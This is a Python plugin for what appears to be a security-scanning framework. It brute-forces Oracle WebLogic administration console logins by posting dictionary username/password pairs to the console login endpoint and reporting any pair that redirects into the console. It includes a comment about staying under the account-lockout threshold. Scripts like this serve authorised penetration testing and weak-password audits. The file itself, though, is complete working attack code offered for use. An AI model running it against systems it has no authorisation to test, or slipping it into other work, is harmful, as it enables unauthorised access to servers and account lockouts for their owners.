#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_TYPE, VUL_LEVEL

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'weblogic burst'
        self.keyword = ['weblogic']
        self.info = 'weblogic burst'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            headers = {
                'Content-Type':  'application/x-www-form-urlencoded'
            }
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
                'dict/weblogic_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
                'dict/weblogic_passwords.txt')
            url = self.base_url + 'console/j_security_check'
            async with ClientSession() as session:
                async for (username, password) in self.generate_dict(usernamedic, passworddic): #    登陆失败错误过多会锁账户，不建议尝试爆破过多,5次以下差不多
                    data = 'j_username={}&j_password={}&j_character_encoding=UTF-8'.format(username, password)
                    async with session.post(url=url, data=data, headers=headers, allow_redirects=False) as res:
                        if res != None and res.status == 302:
                            location = res.headers.get('Location', '')
                            if '/console' in location and '/login/LoginForm.jsp' not in location:
                            # if ('Home Page' in text or 'WebLogic Server Console' in text and 'console.portal' in text):
                                self.flag = 1
                                self.res.append({"info": username + "/" + password, "key": "weblogic burst"})
                                return

